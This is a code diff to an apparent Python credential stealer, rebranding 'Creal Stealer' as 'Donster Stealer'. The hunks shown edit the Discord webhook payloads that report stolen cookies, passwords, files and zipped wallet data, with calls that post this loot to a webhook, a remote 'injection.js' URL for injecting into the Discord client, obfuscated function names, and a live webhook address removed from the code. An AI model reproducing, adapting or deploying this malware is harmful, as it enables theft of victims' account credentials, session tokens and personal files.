@@ -24,7 +24,7 @@ import wmi
 
 
 
-hook = "https://discord.com/api/webhooks/1082085746158080050/RHZofqTIi6QOZUNCDfm-iyAEfCcX_fLDk-JtB8MlGR8g-Kvf_I-9UlPdBoQRISGrAfj2"
+hook = "webhook here"
 inj_url = "https://raw.githubusercontent.com/donnyboi1234/1337wtf1337/main/injection.js"
 
 
@@ -421,16 +421,16 @@ def upl05dT4k31(t0k3n, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "Creal Stealer",
-                "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                "text": "Donster Stealer",
+                "icon_url": "https://cdn.discordapp.com/attachments/1040775867187613747/1082085049584853022/07FAD6BF-D137-404A-BB75-7BC024A3A84F.png"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
-        "username": "Creal Stealer",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1040775867187613747/1082085049584853022/07FAD6BF-D137-404A-BB75-7BC024A3A84F.png",
+        "username": "Donster",
         "attachments": []
         }
     L04durl1b(hook, data=dumps(data).encode(), headers=headers)
@@ -458,17 +458,17 @@ def upload(name, link):
             "content": f"{globalInfo()}",
             "embeds": [
                 {
-                    "title": "Creal | Cookies Stealer",
+                    "title": "Donster | Cookies Stealer",
                     "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "Creal Stealer",
-                        "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                        "text": "Donster Stealer",
+                        "icon_url": "https://cdn.discordapp.com/attachments/1040775867187613747/1082085049584853022/07FAD6BF-D137-404A-BB75-7BC024A3A84F.png"
                     }
                 }
             ],
-            "username": "Creal Stealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+            "username": "Donster Stealer",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1040775867187613747/1082085049584853022/07FAD6BF-D137-404A-BB75-7BC024A3A84F.png",
             "attachments": []
             }
         L04durl1b(hook, data=dumps(data).encode(), headers=headers)
@@ -484,17 +484,17 @@ def upload(name, link):
             "content": f"{globalInfo()}",
             "embeds": [
                 {
-                    "title": "Creal | Password Stealer",
+                    "title": "Donster | Password Stealer",
                     "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "Creal Stealer",
-                        "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                        "text": "Donster Stealer",
+                        "icon_url": "https://cdn.discordapp.com/attachments/1040775867187613747/1082085049584853022/07FAD6BF-D137-404A-BB75-7BC024A3A84F.png"
                     }
                 }
             ],
-            "username": "Creal",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+            "username": "Donster",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1040775867187613747/1082085049584853022/07FAD6BF-D137-404A-BB75-7BC024A3A84F.png",
             "attachments": []
             }
         L04durl1b(hook, data=dumps(data).encode(), headers=headers)
@@ -513,16 +513,16 @@ def upload(name, link):
                     }
                 ],
                 "author": {
-                    "name": "Creal | File Stealer"
+                    "name": "Donster | File Stealer"
                 },
                 "footer": {
-                    "text": "Creal Stealer",
-                    "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                    "text": "Donster Stealer",
+                    "icon_url": "https://cdn.discordapp.com/attachments/1040775867187613747/1082085049584853022/07FAD6BF-D137-404A-BB75-7BC024A3A84F.png"
                 }
                 }
             ],
-            "username": "Creal Stealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+            "username": "Donster Stealer",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1040775867187613747/1082085049584853022/07FAD6BF-D137-404A-BB75-7BC024A3A84F.png",
             "attachments": []
             }
         L04durl1b(hook, data=dumps(data).encode(), headers=headers)
@@ -547,7 +547,7 @@ def upload(name, link):
 def wr1tef0rf1l3(data, name):
     path = os.getenv("TEMP") + f"\cr{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--Creal STEALER BEST -->\n\n")
+        f.write(f"<--DONSTERS STEALER DA BEST -->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -712,17 +712,17 @@ def GatherZips(paths1, paths2, paths3):
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "Creal Zips",
+            "title": "Donster Zips",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 2895667,
             "footer": {
-                "text": "Creal Stealer",
-                "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                "text": "Donster Stealer",
+                "icon_url": "https://cdn.discordapp.com/attachments/1040775867187613747/1082085049584853022/07FAD6BF-D137-404A-BB75-7BC024A3A84F.png"
             }
             }
         ],
-        "username": "Creal Stealer",
-        "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+        "username": "Donster Stealer",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1040775867187613747/1082085049584853022/07FAD6BF-D137-404A-BB75-7BC024A3A84F.png",
         "attachments": []
     }
     L04durl1b(hook, data=dumps(data).encode(), headers=headers)
